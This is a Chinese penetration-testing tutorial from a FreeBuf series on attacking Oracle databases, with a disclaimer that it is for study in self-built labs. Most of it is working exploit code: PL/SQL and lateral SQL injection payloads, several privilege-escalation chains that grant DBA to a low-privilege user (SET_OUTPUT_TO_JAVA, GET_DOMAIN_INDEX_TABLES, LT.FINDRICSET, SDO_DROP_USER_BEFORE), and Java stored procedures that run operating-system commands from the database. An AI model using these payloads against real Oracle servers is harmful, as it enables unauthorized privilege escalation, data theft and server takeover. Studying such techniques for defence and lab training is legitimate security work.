## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

数据库作为业务平台信息技术的核心和基础，承载着越来越多的关键数据，渐渐成为单位公共安全中最具有战略性的资产，数据库的安全稳定运行也直接决定着业务系统能否正常使用。并且平台的数据库中往往储存着等极其重要和敏感的信息。这些信息一旦被篡改或者泄露，轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。所以对数据库的保护是一项必须的，关键的，重要的工作任务。

通过前几期钓鱼、内网攻防篇章落幕后，引来了服务攻防篇章之数据库渗透篇，不管在外网还是内网环境，只要存在业务系统都存在数据库，在渗透测试对数据库的知识学习是必不可少的，接下来将介绍数据库的渗透基本操作，带小伙伴们了解和学习数据库如何渗透的！

如果连Oracle都不会提权，怎么进行下一步的研究Oracle数据库安全！怎么拿下对方服务器？

## 二、PL/SQL Injection

PL/SQL
是Oracle公司在标准SQL语言的基础上进行扩展，可以在数据库上进行设计编程的一种过程化的语言，类似程序语言JAVA一样可以实现逻辑判断、条件循环、异常处理等细节操作，可以处理复杂性问题。

 **PL/SQL通常有以下用途：**

    
    
    创建存储过程
    创建函数
    创建触发器
    创建对象
    …
    

需要注意的一点是PL/SQL的执行权限，这个非常重要，说到这个就不得不提到AUTHID CURRENT_USER:

    
    
    1、如果PL/SQL使用AUTHID CURRENT_USER关键词创建，那么在它执行时会以调用者(invoker)的权限来执行
    2、如果没有这个关键词，那么在它执行时会以它的定义者(definer)的权限来执行
    

还有最重要的一点，Oracle不支持堆叠注入(多语句执行)

至于PL/SQL注入是什么，其实原理就是类似于SQL注入，但利用时有一些oracle自身的特性是需要注意的，看了下面例子差不多就明白了

### 1、Cursor Injection

先来看下面这个procedure，由DBA(SYS)创建，并赋予public执行权限，也就是说数据库能所有用户都可以调用这个procedure

由于没有声明AUTHID CURRENT_USER，所以该存储进程执行时的权限是其定义者(definer)，也就是SYS：

    
    
    CONNECT / AS SYSDBA;
    
    CREATE OR REPLACE PROCEDURE GET_OWNER (P_OBJNM VARCHAR) IS
    TYPE C_TYPE IS REF CURSOR;
    CV C_TYPE;
    BUFFER VARCHAR2(200);
    BEGIN
    DBMS_OUTPUT.ENABLE(1000000);
    OPEN CV FOR 'SELECT OWNER FROM ALL_OBJECTS
    WHERE OBJECT_NAME = ''' || P_OBJNM ||'''';
    LOOP
    FETCH CV INTO BUFFER;
    DBMS_OUTPUT.PUT_LINE(BUFFER);
    EXIT WHEN CV%NOTFOUND;
    END LOOP;
    CLOSE CV;
    END;
    /
    
    GRANT EXECUTE ON GET_OWNER TO PUBLIC;
    

![1626490303_60f245bfd267aee595359.png!small?1626490304435](https://image.3001.net/images/20210717/1626490303_60f245bfd267aee595359.png!small?1626490304435)

很明显P_OBJNM是存在SQL注入的，但由于Oracle不支持堆叠查询，我们只能够使用联合查询来注出一些数据，但仅仅查数据肯定不能满足我们的需求。

    
    
    set serveroutput on;
    exec SYS.GET_OWNER('AAA'' union select PASSWORD from SYS.DBA_USERS --');
    

我们可以创建一个执行其他命令的函数（需要CREATE PROCEDURE权限），并且加上AUTHID
CURRENT_USER，然后用||将函数注入到SQL语句中，当SQL语句以SYS权限执行时，这个被注入的函数作为SQL语句的一部分也会被执行：

    
    
    CREATE OR REPLACE FUNCTION GET_DBA RETURN VARCHAR AUTHID
    CURRENT_USER IS
    PRAGMA AUTONOMOUS_TRANSACTION;
    BEGIN
    EXECUTE IMMEDIATE 'GRANT DBA TO PUBLIC';
    RETURN 'GOT_DBA_PRIVS';
    END;
    / 
    
    exec SYS.GET_OWNER('AAA''||TEST5.GET_DBA --');
    

![1626490311_60f245c71e00e46eab630.png!small?1626490311668](https://image.3001.net/images/20210717/1626490311_60f245c71e00e46eab630.png!small?1626490311668)

在这里的GET_DBA这种函数被称为辅助注入函数，如果我们没有办法自己创建辅助注入函数的话，就要寻找oracle上已经存在的、可以辅助注入的函数。其它的可以看这里：

    
    
    https://www.t00ls.net/articles-23609.html
    
    http://www.davidlitchfield.com/HackingAurora.pdf
    

### 2、Lateral SQL Injection

这个是Oracle SQL注入的另一种利用手法，与我们通常理解的Web或代码层面SQL注入不太一样，它主要针对以下两种情况：

    
    
    Procedure不接收用户输入的参数（参数不可控）
    Procedure中SQL语句拼接的参数被定义为NUMBER或DATA类型
    

先看下面这个存储过程，它接收一个日期类型的参数，并将参数动态拼接入SQL语句：

    
    
    create or replace procedure date_proc_2 (p_date DATE) is
    stmt varchar2(200);
    begin
    stmt:='select object_name from all_objects where created = ''' || p_date || '''';
    dbms_output.put_line(stmt);
    execute immediate stmt;
    end;
    / 
    

![1626490321_60f245d18a3de5ad33278.png!small?1626490321850](https://image.3001.net/images/20210717/1626490321_60f245d18a3de5ad33278.png!small?1626490321850)先来尝试注入一下：

    
    
    exec date_proc_2('11''||TEST5.GET_DBA --');
    

![1626490326_60f245d60ad9c16f87d89.png!small?1626490326387](https://image.3001.net/images/20210717/1626490326_60f245d60ad9c16f87d89.png!small?1626490326387)直接GG，通常这种情况可能被认为无法注入，但如果我们有ALTER
SESSION权限的话，就可以欺骗PL/SQL编译器将任意SQL语句作为日期类型（其实原本这个功能是用来修改日期类型的格式的）

    
    
    ALTER SESSION SET NLS_DATE_FORMAT = '"'' and TEST6.GET_DBA()=1--"';
    
    -- 然后注入获取DBA
    exec SYS.date_proc_2(''' and TEST6.GET_DBA()=1--');
    
    set role dba;
    

如图所示：  
![1626490331_60f245dbb8d67e6cf06be.png!small?1626490332098](https://image.3001.net/images/20210717/1626490331_60f245dbb8d67e6cf06be.png!small?1626490332098)再来看这样一个存储进程，它不接收任何参数，拼接入SQL语句中的参数从sysdate中获取：

    
    
    create or replace procedure date_proc is
    stmt varchar2(200);
    v_date date:=sysdate;
    begin
    stmt:='select object_name from all_objects where created = ''' || v_date || '''';
    dbms_output.put_line(stmt);
    execute immediate stmt;
    end;
    / 
    

![1626490336_60f245e058541fc00bc93.png!small?1626490336621](https://image.3001.net/images/20210717/1626490336_60f245e058541fc00bc93.png!small?1626490336621)

我们故技重施，去污染date类型：

    
    
    select SYSDATE from dual;
    
    ALTER SESSION SET NLS_DATE_FORMAT = '"THIS IS A SINGLE QUOTE ''"';
    select SYSDATE from dual;
    

![1626490341_60f245e53709cf2e2d9f4.png!small?1626490341802](https://image.3001.net/images/20210717/1626490341_60f245e53709cf2e2d9f4.png!small?1626490341802)可以看到成功添加一个单引号进去，此时我们再去执行上面的Procedure，会得到一个单引号未正常闭合的报错：

    
    
    exec SYS.DATE_PROC();
    

![1626490464_60f2466041dd380a9f62b.png!small?1626490464989](https://image.3001.net/images/20210717/1626490464_60f2466041dd380a9f62b.png!small?1626490464989)那么我们是否能够将语句成功注入进去呢？答案是暂时还不行，因为date类型限制了长度，如下图：

    
    
    ALTER SESSION SET NLS_DATE_FORMAT = '"THIS IS A SINGLE QUOTE ''aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"';
    

![1626490469_60f24665b832cf544a5e7.png!small?1626490470197](https://image.3001.net/images/20210717/1626490469_60f24665b832cf544a5e7.png!small?1626490470197)但是oracle有个游标（可以理解为给你的语句一个ID，然后执行的时候直接通过ID执行即可）正好可以被我们所利用  
关于游标可参考：  
https://www.cnblogs.com/huyong/archive/2011/05/04/2036377.html

    
    
    set serveroutput on;
    
    DECLARE
    N NUMBER;
    BEGIN
    N:=DBMS_SQL.OPEN_CURSOR();
    DBMS_SQL.PARSE(N,'DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN
    EXECUTE IMMEDIATE ''GRANT DBA TO TEST5''; END;',0);
    DBMS_OUTPUT.PUT_LINE('Cursor is: '|| N);
    END;
    / 
    

![1626490477_60f2466dcb66d846bc224.png!small?1626490478146](https://image.3001.net/images/20210717/1626490477_60f2466dcb66d846bc224.png!small?1626490478146)注意开启输出，不然无法打印游标号!!

之后就是污染date类型，进而实现SQL注入:

    
    
    ALTER SESSION SET NLS_DATE_FORMAT = '"'' AND DBMS_SQL.EXECUTE(1)=1--"';
    
    -- 此时再执行Procedure
    exec SYS.DATE_PROC();
    

**这里停止了，较为深入！！**

## 三、权限提升

### 1、SET_OUTPUT_TO_JAVA

    
    
    测试环境： Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit
    权限要求：CREATE SESSION
    

利用DBMS_JAVA.SET_OUTPUT_TO_JAVA()函数的特性来提升只拥有CREATE SESSION的用户的权限

#### 1）原理

该函数可以利用前面提到的Lateral SQL Injection来进行注入，进而获取DBA权限，先来看他的参数：  
![1626490492_60f2467cb9d04470faa2a.png!small?1626490493091](https://image.3001.net/images/20210717/1626490492_60f2467cb9d04470faa2a.png!small?1626490493091)其中后两个参数允许我们传入SQL语句

这个函数允许用户在另一个新的虚拟session中重定向java输出写入到System.out和System.err，最后两个参数的SQL语句将在这个新session中执行

如果攻击者可以得到一个属于SYS的使用java的package并将它写入System.out和System.err，那么这个新会话的所属者就是SYS，进而所执行的SQL语句也将以SYS权限执行

而DBMS_CDC_ISUBSCRIBE正是一个符合条件package，它可被public执行，属于SYS并且是definer权限执行，通过将无效的订阅名传递给这个包的e
INT_PURGE_WINDOW过程，则可以将错误强制写入System.err，随后将以SYS权限执行前一个请求的参数中提供的SQL语句

#### 2）利用

创建普通用户：

    
    
    create user 用户名 identified by 密码
    create user dayu identified by dayu123;
    

![1626490499_60f246839992882b3b7db.png!small?1626490499757](https://image.3001.net/images/20210717/1626490499_60f246839992882b3b7db.png!small?1626490499757)给用户连接赋予权限:

    
    
    grant 权限 to 用户;
    
    grant create session to dayu;
    #connect,resource 是角色，角色有多个权限
    CREATE PROCEDURE
    

![1626490503_60f246876d2b65c2700d0.png!small?1626490503575](https://image.3001.net/images/20210717/1626490503_60f246876d2b65c2700d0.png!small?1626490503575)

切换用户:

    
    
    connect user/passwrod；
    connect dayu/dayu123;
    

![1626490508_60f2468c2430749cefb64.png!small?1626490508248](https://image.3001.net/images/20210717/1626490508_60f2468c2430749cefb64.png!small?1626490508248)

简单查看权限：

    
    
    select * from user_role_privs;
    select t.DEFAULT_ROLE from user_role_privs t where t.granted_role='DBA';
    

![1626490512_60f246901d27710b05daf.png!small?1626490512304](https://image.3001.net/images/20210717/1626490512_60f246901d27710b05daf.png!small?1626490512304)

**开始提权：**

    
    
    -- 注意替换GRANT语句中的用户名
    SELECT DBMS_JAVA.SET_OUTPUT_TO_JAVA('ID','oracle/aurora/rdbms/DbmsJava','SYS','writeOutputToFile','TEXT', NULL, NULL, NULL, NULL,0,1,1,1,1,0,'DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''GRANT DBA TO dayu''; END;', 'BEGIN NULL; END;') FROM DUAL;
    
    -- 这句执行会报错，但不影响结果
    EXEC DBMS_CDC_ISUBSCRIBE.INT_PURGE_WINDOW('NO_SUCH_SUBSCRIPTION',SYSDATE());
    
    -- 这句其实要不要都行，不执行的话直接grant赋权也行
    set role dba;
    

![1626490518_60f246962bf620036cdce.png!small?1626490518634](https://image.3001.net/images/20210717/1626490518_60f246962bf620036cdce.png!small?1626490518634)

![1626490522_60f2469a52167b0b6dd19.png!small?1626490524451](https://image.3001.net/images/20210717/1626490522_60f2469a52167b0b6dd19.png!small?1626490524451)  
![1626490525_60f2469daf6eb4fcbf26b.png!small?1626490526450](https://image.3001.net/images/20210717/1626490525_60f2469daf6eb4fcbf26b.png!small?1626490526450)

大佬是提权成功了！！！

### 2、GET_DOMAIN_INDEX_TABLES

    
    
    影响版本：Oracle Database <= 10g R2 (未打补丁的情况下)
    测试环境： Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
    权限要求：CREATE SESSION
    

这个利用的是PL/SQL Injection来提升权限

#### 1）原理

先来看SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES这个函数的定义：

    
    
    FUNCTION GET_DOMAIN_INDEX_TABLES (  
    TYPE_NAME IN VARCHAR2,  
    TYPE_SCHEMA IN VARCHAR2,  
    ...
    BEGIN  
    IF GET_TABLES = 1 THEN  
    GETTABLENAMES_CONTEXT := 0;
    ...
    ELSE  
    STMTSTRING :=  
    'BEGIN ' ||  
    '"' || TYPE_SCHEMA || '"."' || TYPE_NAME ||  
    '".ODCIIndexUtilCleanup(:p1); ' ||  
    'END;';  
    DBMS_SQL.PARSE(CRS, STMTSTRING, DBMS_SYS_SQL.V7);  
    DBMS_SQL.BIND_VARIABLE(CRS,':p1',GETTABLENAMES_CONTEXT);  
    DUMMY := DBMS_SQL.EXECUTE(CRS);  
    DBMS_SQL.CLOSE_CURSOR(CRS);  
    STMTSTRING := '';
    ...
    

可以看到当GET_TABLES != 1时，TYPE_NAME和TYPE_SCHEMA被直接动态拼接进PL/SQL语句中并执行

由于这个函数是以definer权限来执行的，所以我们注入的语句也会以SYS权限来执行

因此我们构造语句，传入参数TYPE_NAME：

    
    
    DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to test2'''';END;'';END;--    

我本地用pl/sql手动打印看一下：

    
    
    select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to dayu'''';END;'';END;--','SYS',0,'1',0) from dual;
    

在10g版本可以执行并未打补丁！

### 3、LT.FINDRICSET

    
    
    测试环境： Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
    
    权限要求：
    CREATE SESSION
    CREATE PROCEDURE
    

该方法利用SYS.LT.FINDRICSET这个函数的注入漏洞来实现权限的提升：

#### 1）原理

看定义：

    
    
    PROCEDURE FINDRICSET( TABLE_NAME VARCHAR2, RESULT_TABLE VARCHAR2 DEFAULT '' )  
    IS  
    TABOWNER VARCHAR2(100);  
    TABNAME VARCHAR2(100);  
    RESOWNER VARCHAR2(100);  
    RESNAME VARCHAR2(100);  
    BEGIN  
    SYS.LT_CTX_PKG.SETUSER ;
    
         TABOWNER := NVL(SUBSTR(UPPER(TABLE_NAME),1,INSTR(TABLE_NAME,'.')-1), SYS_CONTEXT('lt_ctx', 'current_schema'));
         TABNAME  := SUBSTR(UPPER(TABLE_NAME),INSTR(TABLE_NAME,'.')+1);
    
         IF ( RESULT_TABLE IS NOT NULL ) THEN
            RESOWNER := NVL(SUBSTR(UPPER(RESULT_TABLE),1,INSTR(RESULT_TABLE,'.')-1), SYS_CONTEXT('lt_ctx', 'current_schema'));
            RESNAME  := SUBSTR(UPPER(RESULT_TABLE),INSTR(RESULT_TABLE,'.')+1);
         END IF;
    
         IF ( RESULT_TABLE IS NOT NULL AND 
              NOT HASOUTPUTTABPRIVS( RESOWNER, RESNAME ) ) THEN SYS.WM_ERROR.RAISEERROR(SYS.LT.WM_ERROR_171_NO, 'insufficient privileges on the result table');
         END IF;
    
         SYS.LTRIC.FINDRICSET( TABOWNER, TABNAME, RESOWNER, RESNAME );
    
    
    END;
    

这个函数又调用了SYS.LTRIC.FINDRICSET，定义如下：

    
    
    PROCEDURE FINDRICSET( IN_TABLE_OWNER VARCHAR2, IN_TABLE_NAME VARCHAR2,  
    RESULT_TABLE_OWNER VARCHAR2, RESULT_TABLE VARCHAR2 )  
    ... 
    EXECUTE IMMEDIATE 'insert into wmsys.wm$ric_set_in values ( ''' || IN_TABLE_OWNER || ''',''' || IN_TABLE_NAME || ''' )'; 
    

IN_TABLE_OWNER和IN_TABLE_NAME直接动态拼接到SQL语句中，是可以注入的点

我们自己创建一个赋权的存储进程，然后闭合SQL语句，在参数处调用存储进程

被注入后的sql语句应该是这样的：  
![1626490539_60f246ab60bacc4722905.png!small?1626490541058](https://image.3001.net/images/20210717/1626490539_60f246ab60bacc4722905.png!small?1626490541058)（图上稍微有点问题，不过大概就是这意思）

    
    
    EXECUTE IMMEDIATE 'insert into wmsys.wm$ric_set_in values (''A'',''A''||TEST2.GET_DBA) --' )';
    

#### 2）利用

    
    
    -- 注意修改其中的用户名
    create or replace function get_dba return varchar2 authid current_user is PRAGMA autonomous_transaction;
    BEGIN 
    execute immediate 'grant dba to dayu';
    commit;
    return 'z';
    END; 
    /
    begin 
    sys.lt.findricset('A.A''||dayu.get_dba) --','BBBB');
    commit;
    end;
    /
    

![1626490546_60f246b2daebdd4948ab3.png!small?1626490547546](https://image.3001.net/images/20210717/1626490546_60f246b2daebdd4948ab3.png!small?1626490547546)成功图:  
![1626490552_60f246b81566b53c4ca9c.png!small?1626490552760](https://image.3001.net/images/20210717/1626490552_60f246b81566b53c4ca9c.png!small?1626490552760)

注入环境中可使用dbms_xmlquery.newcontext来执行：

    
    
    select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;  
    begin execute immediate ''create or replace function get_dba return varchar2 authid current_user is PRAGMA  
    autonomous_transaction;BEGIN execute immediate ''''grant dba to hellove'''';commit;return ''''z'''';END; ''; commit; end;')  
    from dual;
    
    select dbms_xmlquery.newcontext('declare PRAGMA  
    AUTONOMOUS_TRANSACTION;begin sys.lt.findricset(''A.A''''||hellove.get_dba)--'',''BBBB'');commit;end;') from dual;
    

### 4、SDO_DROP_USER_BEFORE

    
    
    测试环境： Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
    
    权限要求：CREATE SESSION
    

这个是一个触发器(trigger)漏洞  
触发器在数据库里以独立的对象存储，它与存储过程和函数不同的是，存储过程与函数需要用户显示调用才执行，而触发器是由一个事件来启动运行。

#### 1）原理

先看SDO_DROP_USER_BEFORE这个触发器的的定义吧：

    
    
    trigger sdo_drop_user_before  
    before drop on DATABASE  
    declare  
    stmt varchar2(200);  
    rdf_exception EXCEPTION; pragma exception_init(rdf_exception, -20000);  
    BEGIN  
    if dictionary_obj_type = 'USER' THEN  
    BEGIN  
    EXECUTE IMMEDIATE  
    'begin ' ||  
    'mdsys.rdf_apis_internal.' ||  
    'notify_drop_user(''' ||  
    dictionary_obj_name || '''); ' ||  
    'end;';  
    EXCEPTION  
    WHEN rdf_exception THEN RAISE;  
    WHEN OTHERS THEN NULL;  
    END;  
    end if;  
    end;
    

可以看出这个触发器是在drop用户时会执行对应的命令，而dictionary_obj_name被动态拼接到PL/SQL中，存在注入

但SDO_DROP_USER_BEFORE这个触发器属于MDSYS，而且是以definer的权限来执行的，MDSYS在oracle
9i中是DBA权限，后来在10g R2上被降权了，因此无法直接通过注入来获取DBA权限

但是也不是毫无办法，MDSYS拥有create any trigger，也就是说我们可以利用这个注入来任意创建触发器

那么我们完全可以在SYSTEM下创建一个触发器来执行我们想要的命令，然后触发这个新创建触发器，从而以system来执行我们的命令

直接看POC，使用游标创建一个procedure（当然也可以不使用游标），该过程在system下创建一个触发器，当向system.OL$中插入数据时（默认public可向该表中插入数据），就会触发执行grant
dba to public：

    
    
    DECLARE
    MY_CURSOR NUMBER;
    RESULT NUMBER;
    BEGIN
    MY_CURSOR := DBMS_SQL.OPEN_CURSOR;
    DBMS_SQL.PARSE(MY_CURSOR,'declare pragma autonomous_transaction; begin DBMS_OUTPUT.PUT_LINE(''EXECUTING FROM SDO_DROP_USER_BEFORE!!!''); execute immediate ''create or replace trigger system.WHOPPEE before insert on system.OL$ DECLARE msg VARCHAR2(30); BEGIN null; dbms_output.put_line(''''In the trigger''''); EXECUTE IMMEDIATE ''''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''''''GRANT DBA TO PUBLIC''''''''; END; ''''; end WHOPPEE;''; commit; end;',0);
    DBMS_OUTPUT.PUT_LINE('Cursor value is :' || MY_CURSOR);
    END;
    / 
    

之后将注入该procedure的payload放到drop的用户名中，触发SDO_DROP_USER_BEFORE执行，再向system.OL$中插入数据即可

    
    
    DROP USER "'||CHR(DBMS_SQL.EXECUTE(5))||'";
    
    INSERT INTO SYSTEM.OL$ (OL_NAME) VALUES ('OWNED!');
    

#### 2）利用

![1626490562_60f246c2b2b69caf48252.png!small?1626490563048](https://image.3001.net/images/20210717/1626490562_60f246c2b2b69caf48252.png!small?1626490563048)

    
    
    -- 一定要有这一句，不然后面的Cursor value无法输出
    SET SERVEROUTPUT ON;
    
    -- 注意修改grant的用户，执行后记下打印的Cursor value
    DECLARE
    MY_CURSOR NUMBER;
    RESULT NUMBER;
    BEGIN
    MY_CURSOR := DBMS_SQL.OPEN_CURSOR;
    DBMS_SQL.PARSE(MY_CURSOR,'declare pragma autonomous_transaction; begin DBMS_OUTPUT.PUT_LINE(''EXECUTING FROM SDO_DROP_USER_BEFORE!!!''); execute immediate ''create or replace trigger system.WHOPPEE before insert on system.OL$ DECLARE msg VARCHAR2(30); BEGIN null; dbms_output.put_line(''''In the trigger''''); EXECUTE IMMEDIATE ''''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''''''GRANT DBA TO SIMPLEUSER1''''''''; END; ''''; end WHOPPEE;''; commit; end;',0);
    DBMS_OUTPUT.PUT_LINE('Cursor value is :' || MY_CURSOR);
    END;
    / 
    
    -- DBMS_SQL.EXECUTE()中是前面得到的Cursor value
    DROP USER "'||CHR(DBMS_SQL.EXECUTE(5))||'"; 
    
    -- 插入数据来触发条件
    INSERT INTO SYSTEM.OL$ (OL_NAME) VALUES ('OWNED!');
    

![1626490568_60f246c8dbb280823f72d.png!small?1626490569179](https://image.3001.net/images/20210717/1626490568_60f246c8dbb280823f72d.png!small?1626490569179)

![1626490572_60f246ccb4b1ee597a459.png!small?1626490572974](https://image.3001.net/images/20210717/1626490572_60f246ccb4b1ee597a459.png!small?1626490572974)大佬成功图:  
![1626490577_60f246d12cacf211d171b.png!small?1626490578752](https://image.3001.net/images/20210717/1626490577_60f246d12cacf211d171b.png!small?1626490578752)![1626490581_60f246d52484cca5dc746.png!small](https://image.3001.net/images/20210717/1626490581_60f246d52484cca5dc746.png!small)

## 四、命令执行

### 1、DBMS_XMLQUERY

    
    
    测试环境： Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
    
    权限要求：
    CREATE SESSION
    CREATE PROCEDURE （某些版本是否需要CREATE PROCEDURE存疑）
    

![1626490601_60f246e9b4db04263adc9.png!small?1626490602083](https://image.3001.net/images/20210717/1626490601_60f246e9b4db04263adc9.png!small?1626490602083)

1)创建java source：

    
    
    select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;
    

![1626490596_60f246e4088552286ed89.png!small?1626490596228](https://image.3001.net/images/20210717/1626490596_60f246e4088552286ed89.png!small?1626490596228)

2)创建函数：

    
    
    select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;
    

![1626490610_60f246f22406ca60f1b02.png!small?1626490610403](https://image.3001.net/images/20210717/1626490610_60f246f22406ca60f1b02.png!small?1626490610403)

3)可以通过查询OBJECT_ID来判断函数是否创建成功：

    
    
    select OBJECT_ID from all_objects where object_name ='LINXRUNCMD';
    

![1626490613_60f246f5caa65e5e4a846.png!small?1626490614071](https://image.3001.net/images/20210717/1626490613_60f246f5caa65e5e4a846.png!small?1626490614071)

**赋予需要的三个java权限：**  
当前用户为DBA时，通常只需要为该用户赋予第一个执行权限即可，实际情况中具体需要哪一个可以直接执行函数来看报错提示

一般报错如下：  
![1626490622_60f246fe28a5efcdd037d.png!small?1626490622571](https://image.3001.net/images/20210717/1626490622_60f246fe28a5efcdd037d.png!small?1626490622571)

    
    
    DECLARE
    POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
    CURSOR C1 IS SELECT 'GRANT',USER(),'SYS','java.io.FilePermission','<<ALL FILES>>','execute','ENABLED' FROM DUAL;
    BEGIN
    OPEN C1;
    FETCH C1 BULK COLLECT INTO POL;
    CLOSE C1;
    DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
    END;
    /
    DECLARE
    POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
    CURSOR C1 IS SELECT 'GRANT',USER(),'SYS','java.lang.RuntimePermission','writeFileDescriptor',NULL,'ENABLED' FROM DUAL;
    BEGIN
    OPEN C1;
    FETCH C1 BULK COLLECT INTO POL;
    CLOSE C1;
    DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
    END;
    /
    DECLARE
    POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
    CURSOR C1 IS SELECT 'GRANT',USER(),'SYS','java.lang.RuntimePermission','readFileDescriptor',NULL,'ENABLED' FROM DUAL;
    BEGIN
    OPEN C1;
    FETCH C1 BULK COLLECT INTO POL;
    CLOSE C1;
    DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
    END;
    /
    

4)执行命令：

    
    
    select LINXRUNCMD('/sbin/ifconfig') from dual;
    

![1626490628_60f2470420195b49e9b06.png!small](https://image.3001.net/images/20210717/1626490628_60f2470420195b49e9b06.png!small)无法实现！！！

### 2、创建存储进程执行命令

    
    
    测试环境： Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
    
    权限要求：
    CREATE SESSION
    CREATE PROCEDURE
    

有时执行命令也会碰到这种报错，此时需要为用户赋予java的对应权限，最好执行前先执行一次dbms_xmlquery中赋予那三个权限的命令

如果你已经创建完javae函数在执行命令时发现了这个报错，那么要再执行一次2.sql，然后再执行javae函数

1）将下面文件分别保存为  
1.sql：

    
    
    DECLARE
    POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
    CURSOR C1 IS SELECT 
    'GRANT',USER(),'SYS','java.io.FilePermission',
    '<<ALL FILES>>','execute','ENABLED' FROM DUAL;
    BEGIN
    OPEN C1;
    FETCH C1 BULK COLLECT INTO POL;
    CLOSE C1;
    DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
    END;
    /
    

2.sql：

    
    
    create or replace and resolve java source named "oraexec" as
    import java.lang.*;
    import java.io.*;
    public class oraexec
    {
        public static String execCommand(String command) throws IOException, InterruptedException {
            Runtime rt = Runtime.getRuntime();
            int bufSize = 4096;
            byte buffer[] = new byte[bufSize];
            String rc = "";
            int len;
            try{
                Process p = rt.exec(command);
                BufferedInputStream bis =
                        new BufferedInputStream(p.getInputStream(), bufSize);
                while ((len = bis.read(buffer, 0, bufSize)) != -1){
                    rc += new String(buffer).split("\0")[0];;
                }
                bis.close();
                p.waitFor();
                return rc;
            } catch (Exception e) {
                rc = e.getMessage();
            }
            finally
            {
                return rc;
            }
        }
    }
    /
    create or replace
    function javae(p_command in varchar2) return varchar2
    as
    language java
    name 'oraexec.execCommand(java.lang.String) return String';
    /
    

3）放在sqlplus同级目录下，然后分别执行：  
![1626490644_60f24714812ba62bfce68.png!small?1626490644748](https://image.3001.net/images/20210717/1626490644_60f24714812ba62bfce68.png!small?1626490644748)

    
    
    SQL> @1.sql
    
    PL/SQL procedure successfully completed.
    
    SQL> @2.sql
    
    Java created.
    
    
    Function created.
    

![1626490650_60f2471a1a2a0314c391e.png!small?1626490650448](https://image.3001.net/images/20210717/1626490650_60f2471a1a2a0314c391e.png!small?1626490650448)

大佬执行成功：  
![1626490653_60f2471dca302e7bd3de8.png!small?1626490654167](https://image.3001.net/images/20210717/1626490653_60f2471dca302e7bd3de8.png!small?1626490654167)

4）然后执行命令即可：

    
    
    select javae('/sbin/ifconfig') from dual;
    

![1626490658_60f24722c04361bff4d16.png!small?1626490660590](https://image.3001.net/images/20210717/1626490658_60f24722c04361bff4d16.png!small?1626490660590)

### 3、DBMS_JAVA.RUNJAVA

    
    
    测试环境： Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
    
    权限要求：
    CREATE SESSION
    

先给当前用户赋予java.io.FilePermission：

    
    
    DECLARE
    POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
    CURSOR C1 IS SELECT 
    'GRANT',USER(),'SYS','java.io.FilePermission',
    '<<ALL FILES>>','execute','ENABLED' FROM DUAL;
    BEGIN
    OPEN C1;
    FETCH C1 BULK COLLECT INTO POL;
    CLOSE C1;
    DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
    END;
    /
    

然后执行命令：

    
    
    -- 11g
    SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper touch /tmp/success') FROM DUAL;
    
    -- 10g/11g, 注意10g中还需要readFileDescriptor和writeFileDescriptor
